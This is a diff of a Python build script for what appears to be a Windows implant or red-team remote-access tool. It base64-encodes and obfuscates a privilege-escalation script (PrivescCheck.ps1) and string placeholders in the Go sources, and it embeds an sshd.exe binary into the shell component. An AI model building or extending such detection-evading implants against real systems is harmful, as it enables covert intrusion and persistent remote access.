@@ -56,32 +56,36 @@ if __name__ == "__main__":
     # embed privesccheck & obfuscate strings
     os.system("cp client/client_windows.go /tmp/client_windows.go.bak")
     with open("client/client_windows.go", "r+") as f:
-        with open("files/powershell/privesccheck/PrivescCheck.ps1", "rb") as sf:
-            gosrc = f.read()
+        gosrc = f.read()
+        with open("files/powershell/privesccheck/PrivescCheck.ps1", "rb") as sf:            
             scriptsrc = sf.read()
             encoded = base64.b64encode(scriptsrc)
-            # static replacements
-            gosrc = gosrc.replace('§privesccheck§',bake(encoded).decode())     
-            # dynamic replacements
-            pattern = r"§(.*)§"
-            matches = re.finditer(pattern, gosrc, re.MULTILINE)
-            for matchNum, match in enumerate(matches, start=1):
-                placeholder = match.group()
-                gosrc = gosrc.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())                     
-    with open("client/client_windows.go", "w") as f:
-        f.write(gosrc)    
-
-    
-    # obfuscate shell_windows
-    os.system("cp shell/shell_windows.go /tmp/shell_windows.go.bak")
-    with open("shell/shell_windows.go", "r+") as f:        
-        gosrc = f.read()            
+            gosrc = gosrc.replace('§privesccheck§',bake(encoded).decode())
         # dynamic replacements
         pattern = r"§(.*)§"
         matches = re.finditer(pattern, gosrc, re.MULTILINE)
         for matchNum, match in enumerate(matches, start=1):
             placeholder = match.group()
             gosrc = gosrc.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())                     
+    with open("client/client_windows.go", "w") as f:
+        f.write(gosrc)    
+
+    
+    # obfuscate shell_windows
+    os.system("cp shell/shell_windows.go /tmp/shell_windows.go.bak")
+    with open("shell/shell_windows.go", "r+") as f:      
+        gosrc = f.read()   
+        # this one is not encrypted - it would be too slow
+        with open("files/winssh/sshd.exe", "rb") as bf:            
+            bin = bf.read()
+            encoded = base64.b64encode(bin)
+            gosrc = gosrc.replace('§sshd.exe§',encoded.decode())                 
+        # dynamic replacements
+        pattern = r"§(.*)§"
+        matches = re.finditer(pattern, gosrc, re.MULTILINE)
+        for matchNum, match in enumerate(matches, start=1):
+            placeholder = match.group()
+            gosrc = gosrc.replace(placeholder,bake(bytes(placeholder.replace('§',''), encoding='utf8')).decode())                
     with open("shell/shell_windows.go", "w") as f:
         f.write(gosrc)    
 
@@ -122,6 +126,9 @@ if __name__ == "__main__":
                 f.write(enc)
                 f.write("\"\n")
         f.write(")\n")
+
+    # embed windows ssh server
+
 
     # build
     print("[+] Building...")
